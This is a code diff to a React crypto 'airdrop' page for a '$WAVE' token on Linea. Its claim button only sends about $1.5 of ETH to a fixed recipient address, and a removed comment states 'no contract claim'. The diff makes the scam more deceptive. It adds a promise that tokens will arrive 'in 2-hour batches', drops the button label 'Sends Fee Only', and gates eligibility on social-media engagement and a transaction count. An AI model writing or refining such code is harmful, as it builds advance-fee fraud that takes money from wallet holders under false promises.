@@ -17,6 +17,7 @@ declare global {
 const CONTRACT_ADDRESS = "0x4f275a1fF7eD21721dB7cb07efF523aBb2AD2e85"
 const LINEA_CHAIN_ID = "0xe708"
 const PAYMENT_RECIPIENT = "0x640AE2F3c8a447A302F338368e653e156da1e321"
+const LINEASCAN_API = "https://api.lineascan.build/api"
 const isValidContractAddress = CONTRACT_ADDRESS !== "0xYOUR_CONTRACT_ADDRESS" && CONTRACT_ADDRESS.length === 42
 
 function isValidEthereumAddress(address: string) {
@@ -29,6 +30,20 @@ interface AirdropPageProps {
   connectWallet: () => Promise<void>
   disconnectWallet: () => void
   isConnecting: boolean
+}
+
+// Fetch live ETH price (in USD) from Coingecko
+const fetchEthPriceUSD = async (): Promise<number> => {
+  try {
+    const response = await fetch(
+      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"
+    )
+    const data = await response.json()
+    return data.ethereum.usd
+  } catch {
+    // fallback price if failed
+    return 2500
+  }
 }
 
 export default function AirdropPage({
@@ -52,7 +67,8 @@ export default function AirdropPage({
   const [showConnectModal, setShowConnectModal] = useState(false)
   const [copied, setCopied] = useState(false)
   const [showSocialModal, setShowSocialModal] = useState(false)
-  const [showClaimNotOpenModal, setShowClaimNotOpenModal] = useState(false) // NEW STATE
+  const [showClaimNotOpenModal, setShowClaimNotOpenModal] = useState(false)
+  const [txnCount, setTxnCount] = useState<number | null>(null)
 
   useEffect(() => {
     fetchTotalClaims()
@@ -85,7 +101,7 @@ export default function AirdropPage({
                       decimals: 18,
                     },
                     rpcUrls: ["https://rpc.linea.build"],
-                    blockExplorerUrls: ["https://lineascan.build"],
+                    blockExplorerUrls: ["https://api.lineascan.build"],
                   },
                 ],
               })
@@ -125,6 +141,9 @@ export default function AirdropPage({
   const checkAirdrop = async () => {
     const addressToCheck = walletAddress.trim() || connectedAddress
     if (!addressToCheck) return
+    // Reset claim state for new wallet check
+    setHasClaimed(false)
+    setClaimStatus({ step: "idle", message: "" })
     setShowSocialModal(true)
   }
 
@@ -132,17 +151,47 @@ export default function AirdropPage({
     setShowSocialModal(false)
     const addressToCheck = walletAddress.trim() || connectedAddress
     if (!addressToCheck) return
+    setHasClaimed(false)
+    setClaimStatus({ step: "idle", message: "" })
     setIsChecking(true)
     setCheckResult(null)
-    await new Promise((resolve) => setTimeout(resolve, 1500))
+    setTxnCount(null)
+
     const normalizedAddress = addressToCheck.trim()
-    const isEligible = isValidEthereumAddress(normalizedAddress)
-    setCheckResult(isEligible ? "eligible" : "ineligible")
+    if (!isValidEthereumAddress(normalizedAddress)) {
+      setCheckResult("ineligible")
+      setIsChecking(false)
+      return
+    }
+    try {
+      const apiUrl = `${LINEASCAN_API}?module=account&action=txlist&address=${normalizedAddress}&startblock=0&endblock=99999999&sort=asc`
+      const response = await fetch(apiUrl)
+      const data = await response.json()
+      let count = 0
+      if (
+        data.status === "1" &&
+        Array.isArray(data.result)
+      ) {
+        count = data.result.length
+      } else {
+        count = 0
+      }
+      setTxnCount(count)
+      if (count >= 5) {
+        setCheckResult("eligible")
+      } else {
+        setCheckResult("ineligible")
+      }
+    } catch (err) {
+      setCheckResult("ineligible")
+      setTxnCount(null)
+    }
     setIsChecking(false)
   }
 
-  // Fee payment only, no contract claim
+  // Claim fee payment, always sends $1.5 ETH at current price
   const handleClaim = async () => {
+    if (hasClaimed) return
     setIsClaiming(true)
     setClaimStatus({
       step: "payment",
@@ -157,9 +206,7 @@ export default function AirdropPage({
         setIsClaiming(false)
         return
       }
-      // Calculate fee amount
       const feeAmount = await getPaymentAmount()
-      // Send payment transaction
       const txParams = {
         from: connectedAddress,
         to: PAYMENT_RECIPIENT,
@@ -185,9 +232,10 @@ export default function AirdropPage({
     setIsClaiming(false)
   }
 
+  // Sends exactly $1.5 USD worth of ETH
   const getPaymentAmount = async (): Promise<string> => {
     try {
-      const ethPriceUSD = 2500
+      const ethPriceUSD = await fetchEthPriceUSD()
       const paymentUSD = 1.5
       const ethAmount = paymentUSD / ethPriceUSD
       const weiAmount = Math.floor(ethAmount * 1e18)
@@ -239,7 +287,6 @@ export default function AirdropPage({
             </div>
           </div>
         )}
-        {/* SOCIAL MODAL WITH RT/LIKE/FOLLOW BUTTONS */}
         {showSocialModal && (
           <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl">
@@ -256,7 +303,6 @@ export default function AirdropPage({
                   <li>• Then return here to continue</li>
                 </ul>
               </div>
-              {/* BEGIN BUTTONS BLOCK */}
               <div className="flex flex-col gap-3 mb-4">
                 <a
                   href="https://x.com/SadlifeTv_/status/1769708489658495122"
@@ -296,7 +342,6 @@ export default function AirdropPage({
                   </a>
                 </div>
               </div>
-              {/* END BUTTONS BLOCK */}
               <div className="flex gap-3">
                 <button
                   onClick={proceedWithAirdropCheck}
@@ -420,23 +465,27 @@ export default function AirdropPage({
                     ? "Your wallet is eligible for 424242 $WAVE!"
                     : "Your wallet is not eligible for this airdrop."}
                 </div>
+                {txnCount !== null && (
+                  <div className="text-xs text-blue-300 mt-2">
+                    Transaction count on Linea: {txnCount}
+                  </div>
+                )}
                 {checkResult === "eligible" && !hasClaimed && (
                   <div className="mt-4 space-y-2">
                     <div className="text-xs text-green-200 mb-2">
-                      Claim process: Unlock Airdrop ($1.5 fee payment only)
+                      Claim process: Unlock Airdrop ($1.5 fee payment ) ➧ your $WAVE tokens will be automatically airdropped to your wallet in 2-hour batches.   
                     </div>
                     <button
                       onClick={handleClaim}
                       disabled={isClaiming}
                       className="px-6 py-2 bg-green-500 hover:bg-green-400 hover:shadow-lg hover:shadow-green-400/50 disabled:bg-green-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 glow-button"
                     >
-                      {isClaiming
-                        ? "Processing..."
-                        : isConnected
-                          ? "Unlock Airdrop (Sends Fee Only)"
-                          : "Connect Wallet & Claim"}
+                      Unlock &amp; Claim
                     </button>
                   </div>
+                )}
+                {hasClaimed && (
+                  <div className="mt-3 text-green-200 font-semibold">✅ Fee Payment Sent! You have already claimed.</div>
                 )}
                 {claimStatus.step !== "idle" && (
                   <div
@@ -461,7 +510,6 @@ export default function AirdropPage({
                     )}
                   </div>
                 )}
-                {hasClaimed && <div className="mt-3 text-green-200 font-semibold">✅ Fee Payment Sent!</div>}
               </div>
             </div>
           )}
